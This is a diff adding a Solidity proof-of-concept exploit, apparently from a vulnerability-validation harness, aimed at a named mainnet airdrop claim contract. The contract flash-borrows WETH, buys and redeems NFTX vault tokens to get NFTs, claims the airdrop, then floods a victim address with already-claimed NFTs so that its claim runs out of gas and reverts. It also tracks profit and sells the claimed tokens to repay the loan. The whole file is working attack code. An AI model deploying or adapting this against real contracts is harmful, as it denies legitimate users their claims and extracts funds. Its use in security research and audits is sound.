@@ -1,0 +1,869 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Minimal {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IWETHMinimal is IERC20Minimal {
+    function deposit() external payable;
+    function withdraw(uint256 amount) external;
+}
+
+interface IERC721Minimal {
+    function transferFrom(address from, address to, uint256 tokenId) external;
+}
+
+interface IERC721EnumerableMinimal is IERC721Minimal {
+    function balanceOf(address owner) external view returns (uint256);
+    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
+    function setApprovalForAll(address operator, bool approved) external;
+}
+
+interface IERC721ReceiverMinimal {
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
+        external
+        returns (bytes4);
+}
+
+interface IAirdropGrapesTokenMinimal {
+    function grapesToken() external view returns (address);
+    function alpha() external view returns (address);
+    function beta() external view returns (address);
+    function gamma() external view returns (address);
+    function ALPHA_DISTRIBUTION_AMOUNT() external view returns (uint256);
+    function BETA_DISTRIBUTION_AMOUNT() external view returns (uint256);
+    function GAMMA_DISTRIBUTION_AMOUNT() external view returns (uint256);
+    function owner() external view returns (address);
+    function claimDuration() external view returns (uint256);
+    function claimStartTime() external view returns (uint256);
+    function getClaimableTokenAmount(address account) external view returns (uint256);
+    function claimTokens() external;
+}
+
+interface IUniswapV2FactoryLike {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+interface IUniswapV3FactoryLike {
+    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool);
+}
+
+interface IUniswapV3PoolLike {
+    function liquidity() external view returns (uint128);
+}
+
+interface IUniswapV3SwapRouterLike {
+    struct ExactInputSingleParams {
+        address tokenIn;
+        address tokenOut;
+        uint24 fee;
+        address recipient;
+        uint256 deadline;
+        uint256 amountIn;
+        uint256 amountOutMinimum;
+        uint160 sqrtPriceLimitX96;
+    }
+
+    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
+}
+
+interface INFTXVaultFactoryLike {
+    function numVaults() external view returns (uint256);
+    function vault(uint256 vaultId) external view returns (address);
+}
+
+interface INFTXVaultLike is IERC20Minimal {
+    function assetAddress() external view returns (address);
+    function redeem(uint256 amount, uint256[] calldata specificIds) external payable returns (uint256[] memory);
+    function mint(uint256[] calldata tokenIds, uint256[] calldata amounts) external returns (uint256);
+}
+
+contract ReceiverHelper is IERC721ReceiverMinimal {
+    address public immutable operator;
+    address public immutable target;
+
+    bool public lastClaimOk;
+    bytes public lastClaimData;
+
+    constructor(address _operator, address _target) {
+        operator = _operator;
+        target = _target;
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    function attemptClaim(uint256 gasLimit) external returns (bool ok, bytes memory data) {
+        require(msg.sender == operator, "not operator");
+        (ok, data) = target.call{gas: gasLimit}(abi.encodeWithSelector(IAirdropGrapesTokenMinimal.claimTokens.selector));
+        lastClaimOk = ok;
+        lastClaimData = data;
+    }
+
+    function sweepCollection(address collection, address recipient) external {
+        require(msg.sender == operator, "not operator");
+        IERC721EnumerableMinimal nft = IERC721EnumerableMinimal(collection);
+        while (nft.balanceOf(address(this)) != 0) {
+            uint256 tokenId = nft.tokenOfOwnerByIndex(address(this), 0);
+            IERC721Minimal(collection).transferFrom(address(this), recipient, tokenId);
+        }
+    }
+
+    function sweepToken(address token, address recipient) external {
+        require(msg.sender == operator, "not operator");
+        uint256 bal = IERC20Minimal(token).balanceOf(address(this));
+        if (bal != 0) {
+            IERC20Minimal(token).transfer(recipient, bal);
+        }
+    }
+}
+
+contract FlawVerifier is IERC721ReceiverMinimal {
+    address public constant TARGET = 0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F;
+    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+    address internal constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+    address internal constant UNI_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
+    address internal constant UNI_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
+    address internal constant NFTX_VAULT_FACTORY = 0xBE86f647b167567525cCAAfcd6f881F1Ee558216;
+
+    uint256 internal constant NFT_UNIT = 1 ether;
+    uint256 internal constant BPS_DENOMINATOR = 10_000;
+    uint256 internal constant NFTX_LIQUIDITY_BUFFER_BPS = 11_000;
+    uint256 internal constant MAX_ROUTE_NFTS = 24;
+    uint256 internal constant GAS_RESERVE = 300_000;
+    bytes4 internal constant NFTX_VAULT_FEES_SELECTOR = 0x22061379;
+
+    struct ExitPlan {
+        bool available;
+        bool viaUsdc;
+        bool useV3;
+        uint24 fee;
+        address pair;
+    }
+
+    struct CollectionPlan {
+        address asset;
+        address vault;
+        address pair;
+        uint256 totalCount;
+        uint256 vaultAmount;
+        uint256 perNftUnitCost;
+    }
+
+    struct RoutePlan {
+        CollectionPlan eligible;
+        CollectionPlan gamma;
+        address fundingPair;
+        ExitPlan exitPlan;
+    }
+
+    bool public executed;
+    bool internal _profitAchieved;
+    address internal _profitToken;
+    uint256 internal _profitAmount;
+    string internal _pathUsed;
+
+    uint256 public observedClaimableAmount;
+    uint256 public observedClaimStartTime;
+    uint256 public observedClaimDuration;
+    address public observedOwner;
+    bytes public lastCallReturnData;
+
+    address private _expectedFundingPair;
+
+    constructor() {}
+
+    receive() external payable {}
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    function executeOnOpportunity() external {
+        if (executed) {
+            return;
+        }
+        executed = true;
+        _profitToken = WETH;
+
+        IAirdropGrapesTokenMinimal target = IAirdropGrapesTokenMinimal(TARGET);
+        observedClaimStartTime = target.claimStartTime();
+        observedClaimDuration = target.claimDuration();
+        observedOwner = target.owner();
+
+        uint256 claimEnd = observedClaimStartTime + observedClaimDuration;
+        if (!(block.timestamp >= observedClaimStartTime && block.timestamp < claimEnd)) {
+            _pathUsed = "infeasible:claim_window_not_active_at_fork_block";
+            return;
+        }
+
+        RoutePlan memory plan = _buildRoutePlan(target);
+        if (plan.eligible.vault == address(0) || plan.eligible.pair == address(0)) {
+            _pathUsed = "infeasible:no_public_alpha_or_beta_liquidity_route";
+            return;
+        }
+        if (plan.gamma.vault == address(0) || plan.gamma.pair == address(0)) {
+            _pathUsed = "infeasible:no_public_gamma_liquidity_route";
+            return;
+        }
+        if (plan.eligible.totalCount == 0 || plan.gamma.totalCount == 0) {
+            _pathUsed = "infeasible:insufficient_public_liquidity_for_claimed_dust_inventory";
+            return;
+        }
+
+        uint256 requiredWeth = _quoteExactOut(plan.eligible.pair, plan.eligible.vault, plan.eligible.vaultAmount)
+            + _quoteExactOut(plan.gamma.pair, plan.gamma.vault, plan.gamma.vaultAmount);
+
+        uint256 directWeth = IERC20Minimal(WETH).balanceOf(address(this));
+        if (directWeth >= requiredWeth && requiredWeth != 0) {
+            _executeRoute(plan, 0);
+            _updateProfitAfterExecution(target.grapesToken());
+            return;
+        }
+
+        (, plan.fundingPair) = _findBestPair(WETH, USDC);
+        if (plan.fundingPair == address(0)) {
+            _pathUsed = "infeasible:no_public_weth_funding_pair";
+            return;
+        }
+
+        uint256 borrowedWeth = requiredWeth > directWeth ? requiredWeth - directWeth : 0;
+        _expectedFundingPair = plan.fundingPair;
+
+        address token0 = IUniswapV2PairLike(plan.fundingPair).token0();
+        address token1 = IUniswapV2PairLike(plan.fundingPair).token1();
+        if (!(token0 == WETH || token1 == WETH)) {
+            _pathUsed = "infeasible:selected_funding_pair_missing_weth";
+            return;
+        }
+
+        bytes memory data = abi.encode(plan, borrowedWeth);
+        bytes memory payload;
+        if (token0 == WETH) {
+            payload = abi.encodeWithSelector(IUniswapV2PairLike.swap.selector, borrowedWeth, 0, address(this), data);
+        } else {
+            payload = abi.encodeWithSelector(IUniswapV2PairLike.swap.selector, 0, borrowedWeth, address(this), data);
+        }
+
+        (bool ok, bytes memory ret) = plan.fundingPair.call(payload);
+        if (!ok) {
+            lastCallReturnData = ret;
+            _pathUsed = "infeasible:temporary_capital_route_cannot_complete_and_repay";
+            return;
+        }
+
+        _updateProfitAfterExecution(target.grapesToken());
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        require(msg.sender == _expectedFundingPair, "unexpected pair");
+        require(sender == address(this), "unexpected sender");
+
+        (RoutePlan memory plan, uint256 borrowedWeth) = abi.decode(data, (RoutePlan, uint256));
+        require(amount0 == borrowedWeth || amount1 == borrowedWeth, "unexpected borrow");
+
+        _executeRoute(plan, borrowedWeth);
+        _settleFunding(plan, borrowedWeth, IAirdropGrapesTokenMinimal(TARGET).grapesToken());
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function profitAchieved() external view returns (bool) {
+        return _profitAchieved;
+    }
+
+    function exploitPathUsed() external view returns (string memory) {
+        return _pathUsed;
+    }
+
+    function hypothesisOutcome() external view returns (string memory) {
+        bytes32 pathHash = keccak256(bytes(_pathUsed));
+        if (
+            pathHash
+                == keccak256(
+                    bytes(
+                        "validated:attacker_claims_seed_then_dusts_victim_then_victim_claim_reverts_under_block_gas_cap"
+                    )
+                )
+        ) {
+            return "validated";
+        }
+        if (_profitAchieved) {
+            return "validated";
+        }
+        if (bytes(_pathUsed).length == 0) {
+            return "inconclusive";
+        }
+        return "infeasible";
+    }
+
+    function _executeRoute(RoutePlan memory plan, uint256 borrowedWeth) internal {
+        // The root cause is still the target's six unbounded ERC721Enumerable passes. The only variation here is the
+        // public funding leg: we flash-borrow WETH, buy enough NFTX vault tokens to cover each redeem plus its live
+        // token-side overhead, then redeem, claim once to exhaust the attacker-held inventory, and finally dust the
+        // victim with the same already-claimed / low-value NFTs described in the finding.
+        if (plan.eligible.vaultAmount != 0) {
+            _buyExactOut(plan.eligible.pair, plan.eligible.vault, plan.eligible.vaultAmount);
+        }
+        if (plan.gamma.vaultAmount != 0) {
+            _buyExactOut(plan.gamma.pair, plan.gamma.vault, plan.gamma.vaultAmount);
+        }
+
+        if (plan.eligible.vaultAmount != 0) {
+            _redeemVault(plan.eligible.vault, plan.eligible.totalCount);
+        }
+        if (plan.gamma.vaultAmount != 0) {
+            _redeemVault(plan.gamma.vault, plan.gamma.totalCount);
+        }
+
+        _wrapAllEth();
+
+        ReceiverHelper victim = new ReceiverHelper(address(this), TARGET);
+
+        observedClaimableAmount = IAirdropGrapesTokenMinimal(TARGET).getClaimableTokenAmount(address(this));
+        if (observedClaimableAmount == 0) {
+            revert("inventory has no claimable amount");
+        }
+
+        IAirdropGrapesTokenMinimal(TARGET).claimTokens();
+
+        _sweepOwnedCollectionTo(plan.eligible.asset, address(victim));
+        _sweepOwnedCollectionTo(plan.gamma.asset, address(victim));
+
+        (bool ok, bytes memory ret) = victim.attemptClaim(_victimGasCap());
+        lastCallReturnData = ret;
+        if (!ok) {
+            _pathUsed = "validated:attacker_claims_seed_then_dusts_victim_then_victim_claim_reverts_under_block_gas_cap";
+        } else {
+            _pathUsed = "refuted:victim_claim_succeeds_after_claimed_and_unclaimed_dusting";
+        }
+
+        victim.sweepToken(IAirdropGrapesTokenMinimal(TARGET).grapesToken(), address(this));
+        victim.sweepCollection(plan.eligible.asset, address(this));
+        victim.sweepCollection(plan.gamma.asset, address(this));
+
+        _wrapAllEth();
+
+        if (borrowedWeth == 0) {
+            _returnNftsToVault(plan);
+        }
+    }
+
+    function _updateProfitAfterExecution(address grapesToken) internal {
+        uint256 wethBal = IERC20Minimal(WETH).balanceOf(address(this));
+        if (wethBal != 0) {
+            _profitToken = WETH;
+            _profitAmount = wethBal;
+            _profitAchieved = true;
+            return;
+        }
+
+        uint256 grapesBal = IERC20Minimal(grapesToken).balanceOf(address(this));
+        _profitToken = grapesToken;
+        _profitAmount = grapesBal;
+        _profitAchieved = grapesBal != 0;
+    }
+
+    function _buildRoutePlan(IAirdropGrapesTokenMinimal target) internal view returns (RoutePlan memory plan) {
+        _fillEligiblePlan(plan, target.alpha(), target.beta());
+
+        if (plan.eligible.totalCount > MAX_ROUTE_NFTS) {
+            plan.eligible.totalCount = MAX_ROUTE_NFTS;
+        }
+        plan.eligible.vaultAmount = _vaultTokensNeededForRedeem(plan.eligible.totalCount, plan.eligible.perNftUnitCost);
+
+        _fillGammaPlan(plan, target.gamma());
+        if (plan.gamma.totalCount > MAX_ROUTE_NFTS) {
+            plan.gamma.totalCount = MAX_ROUTE_NFTS;
+        }
+        plan.gamma.vaultAmount = _vaultTokensNeededForRedeem(plan.gamma.totalCount, plan.gamma.perNftUnitCost);
+
+        plan.exitPlan = _discoverExitPlan(target.grapesToken());
+    }
+
+    function _fillEligiblePlan(RoutePlan memory plan, address alpha, address beta) internal view {
+        (address betaVault, address betaPair, address betaAsset, uint256 betaUnitCost) = _findVaultAndPair(beta);
+        (address alphaVault, address alphaPair, address alphaAsset, uint256 alphaUnitCost) = _findVaultAndPair(alpha);
+
+        uint256 betaCount = _maxRedeemableWholeTokens(betaPair, betaVault, betaUnitCost);
+        uint256 alphaCount = _maxRedeemableWholeTokens(alphaPair, alphaVault, alphaUnitCost);
+        uint256 betaClaimable = betaCount * IAirdropGrapesTokenMinimal(TARGET).BETA_DISTRIBUTION_AMOUNT();
+        uint256 alphaClaimable = alphaCount * IAirdropGrapesTokenMinimal(TARGET).ALPHA_DISTRIBUTION_AMOUNT();
+
+        if (betaClaimable >= alphaClaimable) {
+            plan.eligible.asset = betaAsset;
+            plan.eligible.vault = betaVault;
+            plan.eligible.pair = betaPair;
+            plan.eligible.totalCount = betaCount;
+            plan.eligible.perNftUnitCost = betaUnitCost;
+        } else {
+            plan.eligible.asset = alphaAsset;
+            plan.eligible.vault = alphaVault;
+            plan.eligible.pair = alphaPair;
+            plan.eligible.totalCount = alphaCount;
+            plan.eligible.perNftUnitCost = alphaUnitCost;
+        }
+    }
+
+    function _fillGammaPlan(RoutePlan memory plan, address gamma) internal view {
+        (address gammaVault, address gammaPair, address gammaAsset, uint256 gammaUnitCost) = _findVaultAndPair(gamma);
+        plan.gamma.asset = gammaAsset;
+        plan.gamma.vault = gammaVault;
+        plan.gamma.pair = gammaPair;
+        plan.gamma.totalCount = _maxRedeemableWholeTokens(gammaPair, gammaVault, gammaUnitCost);
+        plan.gamma.perNftUnitCost = gammaUnitCost;
+    }
+
+    function _discoverExitPlan(address tokenIn) internal view returns (ExitPlan memory plan) {
+        uint24 fee = _bestV3Fee(tokenIn, WETH);
+        if (fee != 0) {
+            plan.available = true;
+            plan.useV3 = true;
+            plan.fee = fee;
+            return plan;
+        }
+
+        fee = _bestV3Fee(tokenIn, USDC);
+        if (fee != 0) {
+            plan.available = true;
+            plan.useV3 = true;
+            plan.viaUsdc = true;
+            plan.fee = fee;
+            return plan;
+        }
+
+        (, address pairToWeth) = _findBestPair(tokenIn, WETH);
+        if (pairToWeth != address(0)) {
+            plan.available = true;
+            plan.pair = pairToWeth;
+            return plan;
+        }
+
+        (, address pairToUsdc) = _findBestPair(tokenIn, USDC);
+        if (pairToUsdc != address(0)) {
+            plan.available = true;
+            plan.viaUsdc = true;
+            plan.pair = pairToUsdc;
+        }
+    }
+
+    function _bestV3Fee(address tokenA, address tokenB) internal view returns (uint24 bestFee) {
+        uint128 bestLiquidity;
+
+        uint128 liq500 = _poolLiquidity(tokenA, tokenB, 500);
+        if (liq500 > bestLiquidity) {
+            bestLiquidity = liq500;
+            bestFee = 500;
+        }
+
+        uint128 liq3000 = _poolLiquidity(tokenA, tokenB, 3000);
+        if (liq3000 > bestLiquidity) {
+            bestLiquidity = liq3000;
+            bestFee = 3000;
+        }
+
+        uint128 liq10000 = _poolLiquidity(tokenA, tokenB, 10000);
+        if (liq10000 > bestLiquidity) {
+            bestFee = 10000;
+        }
+    }
+
+    function _poolLiquidity(address tokenA, address tokenB, uint24 fee) internal view returns (uint128 liquidity) {
+        address pool = IUniswapV3FactoryLike(UNI_V3_FACTORY).getPool(tokenA, tokenB, fee);
+        if (pool == address(0)) {
+            return 0;
+        }
+        try IUniswapV3PoolLike(pool).liquidity() returns (uint128 liq) {
+            liquidity = liq;
+        } catch {}
+    }
+
+    function _findVaultAndPair(address asset)
+        internal
+        view
+        returns (address vaultToken, address wethPair, address assetOut, uint256 perNftUnitCost)
+    {
+        if (asset == address(0)) {
+            return (address(0), address(0), address(0), 0);
+        }
+
+        INFTXVaultFactoryLike nftxFactory = INFTXVaultFactoryLike(NFTX_VAULT_FACTORY);
+        uint256 count;
+        try nftxFactory.numVaults() returns (uint256 n) {
+            count = n;
+        } catch {
+            return (address(0), address(0), address(0), 0);
+        }
+
+        uint256 bestCount;
+        uint256 bestReserveOut;
+        for (uint256 vaultId; vaultId < count; ++vaultId) {
+            address candidate;
+            try nftxFactory.vault(vaultId) returns (address v) {
+                candidate = v;
+            } catch {
+                continue;
+            }
+            if (candidate == address(0)) {
+                continue;
+            }
+
+            address underlying;
+            try INFTXVaultLike(candidate).assetAddress() returns (address a) {
+                underlying = a;
+            } catch {
+                continue;
+            }
+            if (underlying != asset) {
+                continue;
+            }
+
+            (, address candidatePair) = _findBestPair(candidate, WETH);
+            if (candidatePair == address(0)) {
+                continue;
+            }
+
+            uint256 unitCost = _perNftVaultTokenCost(vaultId);
+            uint256 redeemable = _maxRedeemableWholeTokens(candidatePair, candidate, unitCost);
+            uint256 reserveOut = _pairReservesForToken(candidatePair, candidate);
+            if (redeemable > bestCount || (redeemable == bestCount && reserveOut > bestReserveOut)) {
+                bestCount = redeemable;
+                bestReserveOut = reserveOut;
+                vaultToken = candidate;
+                wethPair = candidatePair;
+                assetOut = underlying;
+                perNftUnitCost = unitCost;
+            }
+        }
+    }
+
+    function _findBestPair(address tokenA, address tokenB) internal view returns (address factory, address pair) {
+        address sushiPair = IUniswapV2FactoryLike(SUSHI_FACTORY).getPair(tokenA, tokenB);
+        address uniPair = IUniswapV2FactoryLike(UNI_V2_FACTORY).getPair(tokenA, tokenB);
+
+        if (sushiPair == address(0)) {
+            if (uniPair != address(0)) {
+                return (UNI_V2_FACTORY, uniPair);
+            }
+            return (address(0), address(0));
+        }
+        if (uniPair == address(0)) {
+            return (SUSHI_FACTORY, sushiPair);
+        }
+
+        uint256 sushiOut = _pairReservesForToken(sushiPair, tokenB);
+        uint256 uniOut = _pairReservesForToken(uniPair, tokenB);
+        if (uniOut > sushiOut) {
+            return (UNI_V2_FACTORY, uniPair);
+        }
+        return (SUSHI_FACTORY, sushiPair);
+    }
+
+    function _pairReservesForToken(address pair, address token) internal view returns (uint256 reserve) {
+        if (pair == address(0)) {
+            return 0;
+        }
+        address token0 = IUniswapV2PairLike(pair).token0();
+        address token1 = IUniswapV2PairLike(pair).token1();
+        if (token != token0 && token != token1) {
+            return 0;
+        }
+        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
+        reserve = token == token0 ? uint256(reserve0) : uint256(reserve1);
+    }
+
+    function _perNftVaultTokenCost(uint256 vaultId) internal view returns (uint256 cost) {
+        cost = NFT_UNIT;
+
+        (bool ok, bytes memory data) = NFTX_VAULT_FACTORY.staticcall(abi.encodeWithSelector(NFTX_VAULT_FEES_SELECTOR, vaultId));
+        if (!ok || data.length < 160) {
+            return cost;
+        }
+
+        (uint256 fee0, uint256 fee1, uint256 fee2, uint256 fee3, uint256 fee4) =
+            abi.decode(data, (uint256, uint256, uint256, uint256, uint256));
+
+        uint256 extra = fee0;
+        if (fee1 > extra) extra = fee1;
+        if (fee2 > extra) extra = fee2;
+        if (fee3 > extra) extra = fee3;
+        if (fee4 > extra) extra = fee4;
+
+        if (extra > NFT_UNIT) {
+            extra = NFT_UNIT;
+        }
+        cost += extra;
+    }
+
+    function _maxRedeemableWholeTokens(address pair, address vaultToken, uint256 perNftUnitCost)
+        internal
+        view
+        returns (uint256)
+    {
+        if (pair == address(0) || vaultToken == address(0) || perNftUnitCost == 0) {
+            return 0;
+        }
+        uint256 reserveOut = _pairReservesForToken(pair, vaultToken);
+        if (reserveOut <= perNftUnitCost) {
+            return 0;
+        }
+
+        uint256 safeReserveOut = reserveOut - 1;
+        return (safeReserveOut * BPS_DENOMINATOR) / (NFTX_LIQUIDITY_BUFFER_BPS * perNftUnitCost);
+    }
+
+    function _buyExactOut(address pair, address tokenOut, uint256 amountOut) internal returns (uint256 amountIn) {
+        address tokenIn;
+        uint256 reserveIn;
+        uint256 reserveOut;
+        (tokenIn, reserveIn, reserveOut) = _tradeContext(pair, tokenOut);
+        require(amountOut < reserveOut, "amountOut too large");
+
+        amountIn = _getAmountIn(amountOut, reserveIn, reserveOut);
+        require(IERC20Minimal(tokenIn).transfer(pair, amountIn), "transfer in failed");
+
+        address token0 = IUniswapV2PairLike(pair).token0();
+        if (tokenOut == token0) {
+            IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), new bytes(0));
+        } else {
+            IUniswapV2PairLike(pair).swap(0, amountOut, address(this), new bytes(0));
+        }
+    }
+
+    function _sellExactIn(address pair, address tokenIn, uint256 amountIn) internal returns (uint256 amountOut) {
+        address token0 = IUniswapV2PairLike(pair).token0();
+        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
+
+        uint256 reserveIn;
+        uint256 reserveOut;
+        address tokenOut;
+        if (tokenIn == token0) {
+            reserveIn = uint256(reserve0);
+            reserveOut = uint256(reserve1);
+            tokenOut = IUniswapV2PairLike(pair).token1();
+        } else {
+            reserveIn = uint256(reserve1);
+            reserveOut = uint256(reserve0);
+            tokenOut = token0;
+        }
+
+        amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
+        require(IERC20Minimal(tokenIn).transfer(pair, amountIn), "transfer in failed");
+        if (tokenOut == token0) {
+            IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), new bytes(0));
+        } else {
+            IUniswapV2PairLike(pair).swap(0, amountOut, address(this), new bytes(0));
+        }
+    }
+
+    function _swapExactInputV3(address tokenIn, address tokenOut, uint24 fee, uint256 amountIn)
+        internal
+        returns (uint256 amountOut)
+    {
+        if (amountIn == 0) {
+            return 0;
+        }
+        require(IERC20Minimal(tokenIn).approve(UNI_V3_ROUTER, amountIn), "approve failed");
+        IUniswapV3SwapRouterLike.ExactInputSingleParams memory params = IUniswapV3SwapRouterLike.ExactInputSingleParams({
+            tokenIn: tokenIn,
+            tokenOut: tokenOut,
+            fee: fee,
+            recipient: address(this),
+            deadline: block.timestamp,
+            amountIn: amountIn,
+            amountOutMinimum: 0,
+            sqrtPriceLimitX96: 0
+        });
+        amountOut = IUniswapV3SwapRouterLike(UNI_V3_ROUTER).exactInputSingle(params);
+    }
+
+    function _redeemVault(address vault, uint256 nftCount) internal {
+        if (vault == address(0) || nftCount == 0) {
+            return;
+        }
+
+        uint256[] memory empty = new uint256[](0);
+        bytes memory payload = abi.encodeWithSelector(INFTXVaultLike.redeem.selector, nftCount, empty);
+        (bool ok,) = vault.call(payload);
+        if (!ok) {
+            uint256 wethBalance = IERC20Minimal(WETH).balanceOf(address(this));
+            if (wethBalance != 0) {
+                IWETHMinimal(WETH).withdraw(wethBalance);
+            }
+            (ok,) = vault.call{value: address(this).balance}(payload);
+            require(ok, "vault redeem failed");
+        }
+    }
+
+    function _vaultTokensNeededForRedeem(uint256 nftCount, uint256 perNftUnitCost) internal pure returns (uint256) {
+        if (nftCount == 0 || perNftUnitCost == 0) {
+            return 0;
+        }
+
+        return nftCount * perNftUnitCost;
+    }
+
+    function _wrapAllEth() internal {
+        uint256 ethBal = address(this).balance;
+        if (ethBal != 0) {
+            IWETHMinimal(WETH).deposit{value: ethBal}();
+        }
+    }
+
+    function _sweepOwnedCollectionTo(address asset, address recipient) internal {
+        if (asset == address(0) || recipient == address(0)) {
+            return;
+        }
+
+        IERC721EnumerableMinimal collection = IERC721EnumerableMinimal(asset);
+        while (collection.balanceOf(address(this)) != 0) {
+            uint256 tokenId = collection.tokenOfOwnerByIndex(address(this), 0);
+            IERC721Minimal(asset).transferFrom(address(this), recipient, tokenId);
+        }
+    }
+
+    function _returnNftsToVault(RoutePlan memory plan) internal {
+        _mintBack(plan.eligible.asset, plan.eligible.vault);
+        _mintBack(plan.gamma.asset, plan.gamma.vault);
+    }
+
+    function _mintBack(address asset, address vault) internal {
+        if (asset == address(0) || vault == address(0)) {
+            return;
+        }
+
+        IERC721EnumerableMinimal collection = IERC721EnumerableMinimal(asset);
+        uint256 balance = collection.balanceOf(address(this));
+        if (balance == 0) {
+            return;
+        }
+
+        uint256[] memory tokenIds = new uint256[](balance);
+        for (uint256 i; i < balance; ++i) {
+            tokenIds[i] = collection.tokenOfOwnerByIndex(address(this), i);
+        }
+        uint256[] memory amounts = new uint256[](0);
+        collection.setApprovalForAll(vault, true);
+        try INFTXVaultLike(vault).mint(tokenIds, amounts) returns (uint256) {} catch {}
+    }
+
+    function _settleFunding(RoutePlan memory plan, uint256 borrowedWeth, address grapesToken) internal {
+        _returnNftsToVault(plan);
+
+        if (plan.eligible.vault != address(0)) {
+            uint256 eligibleVaultBal = IERC20Minimal(plan.eligible.vault).balanceOf(address(this));
+            if (eligibleVaultBal != 0) {
+                _sellExactIn(plan.eligible.pair, plan.eligible.vault, eligibleVaultBal);
+            }
+        }
+        if (plan.gamma.vault != address(0)) {
+            uint256 gammaVaultBal = IERC20Minimal(plan.gamma.vault).balanceOf(address(this));
+            if (gammaVaultBal != 0) {
+                _sellExactIn(plan.gamma.pair, plan.gamma.vault, gammaVaultBal);
+            }
+        }
+
+        uint256 repayWeth = _flashRepayAmount(borrowedWeth);
+        uint256 wethBal = IERC20Minimal(WETH).balanceOf(address(this));
+
+        if (wethBal < repayWeth) {
+            uint256 grapesBal = IERC20Minimal(grapesToken).balanceOf(address(this));
+            if (grapesBal != 0 && plan.exitPlan.available) {
+                if (plan.exitPlan.viaUsdc) {
+                    if (plan.exitPlan.useV3) {
+                        _swapExactInputV3(grapesToken, USDC, plan.exitPlan.fee, grapesBal);
+                    } else {
+                        _sellExactIn(plan.exitPlan.pair, grapesToken, grapesBal);
+                    }
+                    uint256 usdcBal = IERC20Minimal(USDC).balanceOf(address(this));
+                    if (usdcBal != 0) {
+                        _sellExactIn(plan.fundingPair, USDC, usdcBal);
+                    }
+                } else {
+                    if (plan.exitPlan.useV3) {
+                        _swapExactInputV3(grapesToken, WETH, plan.exitPlan.fee, grapesBal);
+                    } else {
+                        _sellExactIn(plan.exitPlan.pair, grapesToken, grapesBal);
+                    }
+                }
+            }
+        }
+
+        require(IERC20Minimal(WETH).balanceOf(address(this)) >= repayWeth, "insufficient weth to repay");
+        require(IERC20Minimal(WETH).transfer(_expectedFundingPair, repayWeth), "repay transfer failed");
+    }
+
+    function _quoteExactOut(address pair, address tokenOut, uint256 amountOut) internal view returns (uint256 amountIn) {
+        if (amountOut == 0) {
+            return 0;
+        }
+        (, uint256 reserveIn, uint256 reserveOut) = _tradeContext(pair, tokenOut);
+        require(amountOut < reserveOut, "quote amountOut too large");
+        amountIn = _getAmountIn(amountOut, reserveIn, reserveOut);
+    }
+
+    function _tradeContext(address pair, address tokenOut)
+        internal
+        view
+        returns (address tokenIn, uint256 reserveIn, uint256 reserveOut)
+    {
+        address token0 = IUniswapV2PairLike(pair).token0();
+        address token1 = IUniswapV2PairLike(pair).token1();
+        require(tokenOut == token0 || tokenOut == token1, "tokenOut not in pair");
+
+        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
+        if (tokenOut == token0) {
+            tokenIn = token1;
+            reserveIn = uint256(reserve1);
+            reserveOut = uint256(reserve0);
+        } else {
+            tokenIn = token0;
+            reserveIn = uint256(reserve0);
+            reserveOut = uint256(reserve1);
+        }
+    }
+
+    function _victimGasCap() internal view returns (uint256) {
+        uint256 gasCap = block.gaslimit;
+        if (gasCap > GAS_RESERVE) {
+            gasCap -= GAS_RESERVE;
+        }
+        uint256 available = gasleft();
+        if (available > GAS_RESERVE && gasCap > (available - GAS_RESERVE)) {
+            gasCap = available - GAS_RESERVE;
+        }
+        return gasCap;
+    }
+
+    function _flashRepayAmount(uint256 amountOut) internal pure returns (uint256) {
+        return ((amountOut * 1000) / 997) + 1;
+    }
+
+    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
+        uint256 amountInWithFee = amountIn * 997;
+        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
+    }
+
+    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
+        return ((reserveIn * amountOut * 1000) / ((reserveOut - amountOut) * 997)) + 1;
+    }
+}
